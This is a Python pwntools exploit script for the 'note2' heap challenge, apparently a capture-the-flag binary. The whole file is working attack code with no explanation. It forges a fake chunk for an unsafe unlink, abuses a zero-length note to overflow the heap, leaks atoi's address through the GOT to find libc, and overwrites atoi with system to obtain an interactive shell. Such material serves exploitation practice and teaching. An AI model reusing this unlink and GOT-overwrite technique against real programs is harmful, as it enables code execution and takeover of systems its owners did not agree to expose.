from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./note2"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("option--->>\n",str(idx))

def add(length,content):
    opt(1)
    # p.sendlineafter("",str(idx))
    p.sendlineafter("Input the length of the note content:(less than 128)\n",str(length))
    p.sendlineafter("Input the note content:\n",str(content))

def show(idx):
    opt(2)
    p.sendlineafter("Input the id of the note:\n",str(idx))

def free(idx):
    opt(4)
    p.sendlineafter("Input the id of the note:\n",str(idx))

def overwrite(idx,content):
    opt(3)
    p.sendlineafter("Input the id of the note:\n",str(idx))
    p.sendlineafter("do you want to overwrite or append?[1.overwrite/2.append]\n","1")
    p.sendlineafter("TheNewContents:",str(content))

def append(idx,content):
    opt(3)
    p.sendlineafter("Input the id of the note:\n",str(idx))
    p.sendlineafter("do you want to overwrite or append?[1.overwrite/2.append]\n","2")
    p.sendlineafter("TheNewContents:",str(content))


p.sendlineafter("Input your name:\n","name1")
p.sendlineafter("Input your address:\n","address1")

x = 0x602120
fakefd = x-0x18
fakebk = x-0x10
content = 'a' * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + 'b' * 0x40 + p64(0x60)

add(0x80,content)
add(0,"a"*8)
add(0x80,"b"*0x10)

free(1)
content = 'a' * 16 + p64(0xa0) + p64(0x90)
add(0,content)
free(2)

payload = flat([
    "c"*0x18,elf.got["atoi"]
    ])
overwrite(0,payload)
show(0)

p.recvuntil("Content is ")
atoi_addr = u64(p.recv(6).ljust(8,"\0"))
system_addr = atoi_addr - libc.sym["atoi"] + libc.sym["system"]
log.success("system_addr: " + hex( system_addr ))
payload = flat([
    system_addr
    ])
overwrite(0,payload)

p.interactive()
